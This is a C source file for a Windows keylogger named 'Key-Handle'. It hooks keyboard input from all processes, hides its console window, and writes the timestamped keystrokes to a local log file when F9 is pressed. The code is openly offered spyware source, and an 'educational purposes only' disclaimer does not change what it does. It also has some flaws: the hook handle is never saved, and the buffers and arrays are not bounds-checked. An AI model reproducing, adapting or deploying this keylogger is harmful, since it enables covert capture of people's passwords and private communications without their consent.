/* A program that runs in the background and hooks keyboard input
 * from all processes. I (alta) am not responsible for any malicious
 * modification that is made to this code.
 * 
 * @author: https://github.com/alta-sh
 */

#include <Windows.h>
#include <inttypes.h>
#include <stdio.h>
#include <time.h>

#ifndef _BOOL_DEF_
    #define _BOOL_DEF_
    typedef int bool;
    #define false 0
    #define true 1
#endif

/* prototypes */
void renderMenu(); 
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam);
bool isExitKeyPressed(DWORD key);
void terminateProgram();

/* most people can't write over 1500 characters a minute */
#define MESSAGE_BUFFER_SIZE 1500
HHOOK keyboardHook;
uint_fast16_t messageCount = 1;
uint_fast16_t keyCount = 0;

HWND window;

struct Message {
    char message[MESSAGE_BUFFER_SIZE];
    int hours;
    int minutes;
};

struct Message messages[120];

/* The hook procedure */
LRESULT CALLBACK keyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    PKBDLLHOOKSTRUCT key = (PKBDLLHOOKSTRUCT)lParam;
    DWORD lastKeyPressed = key->vkCode;

    /* Intercepting the input msg */
    if (wParam == WM_KEYDOWN && nCode == HC_ACTION) {
        
        time_t timeOfKey = time(&timeOfKey);
        struct tm* timeOfKeyInfo = localtime(&timeOfKey);
        time(&timeOfKey);
        timeOfKeyInfo = localtime(&timeOfKey);

        if(isExitKeyPressed(lastKeyPressed)) {
            ShowWindow(window, 1);
            puts("Writing to file...");
            MessageBeep(0xFFFFFF);
            Sleep(1500);
            terminateProgram();
        }

        static bool updateTime = true;

        if(updateTime) {
            messages[messageCount].hours = timeOfKeyInfo->tm_hour;
            messages[messageCount].minutes = timeOfKeyInfo->tm_min;
            updateTime = false;
        }

        messages[messageCount].message[keyCount] = (char)lastKeyPressed;
        
        if(messages[messageCount].minutes != timeOfKeyInfo->tm_min) {
            messages[messageCount].message[keyCount + 1] = '\0';
            fflush(stdout);
            printf("Message %d:\n%s", messageCount, messages[messageCount].message);
            messageCount++;
            keyCount = -1;
            updateTime = true;
        }
        keyCount++;
    }
    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}


void clear() { system("cls"); }


bool isExitKeyPressed(DWORD key) {
    if(key == VK_F9) { return true; }
    return false;
}


void terminateProgram() {
     /* Write to file */
        FILE* fp;
        fp = fopen("log.txt", "w");     

        fprintf(fp, "Log results for the past %d minutes:\n", messageCount);

        for(size_t i = 1; i <= messageCount; i++) {
            fprintf(fp, "\n<%02d:%02d> %s",
                    messages[i].hours,
                    messages[i].minutes,
                    messages[i].message);
        }
        fflush(fp);
        fclose(fp);
        exit(0);
}


void handleDirectory() {
    clear();
    puts("\nThis is still under construction...\n\nPress enter to return to the menu.");
    getchar();
    renderMenu();
}


void renderMenu() { 
    printf("\n[ Key-Handle ] - By alta\n\n"
        "Please read the following carefully...\n\n"
        "-------------------------------------------------------------------------------------\n"
        "Key-Handle is a simple key capturing program that runs hidden in the background\n"
        "and writes the keystrokes to a textfile in the directory the program was ran from.\n\n"
        "### DISCLAIMER: alta is not responsible for any malicious use of this software, ###\n"
        "###             it was made for educational purposes only.                      ###\n"
        "-------------------------------------------------------------------------------------\n\n"
        "Once capturing begins:\n"
        "You will hear 3 beeps, this console will be hidden and will capture all key strokes \n"
        "in the background. When you're done capturing, press the F9 key, you will hear a \n"
        "final beep to confirm everything closed successfully and the program will create \n"
        "a log.txt file summarising the monitoring session.\n\n"
        "Press enter to start capturing...%c", ' ');
    getchar();
    /* Initialising the HHOOK */
    if (!SetWindowsHookEx(WH_KEYBOARD_LL, keyboardProc, NULL, 0)) {
        MessageBox(NULL, "Failed to install hook!", "Error", MB_ICONERROR);
    } else {
        puts("Hook Successful!\n");
    }
}


int main(int argc, char* argv[]) {
    AllocConsole();
    window = FindWindowA("ConsoleWindowClass", NULL);

    renderMenu(); 
    for(size_t i = 0; i < 3; i++) {
        MessageBeep(0xFFFFFF);
        Sleep(500);
    }
    ShowWindow(window, 0);
    
    MSG msg;
        while (GetMessage(&msg, NULL, 0, 0) != 0);
            UnhookWindowsHookEx(keyboardHook);
    return EXIT_SUCCESS;
}
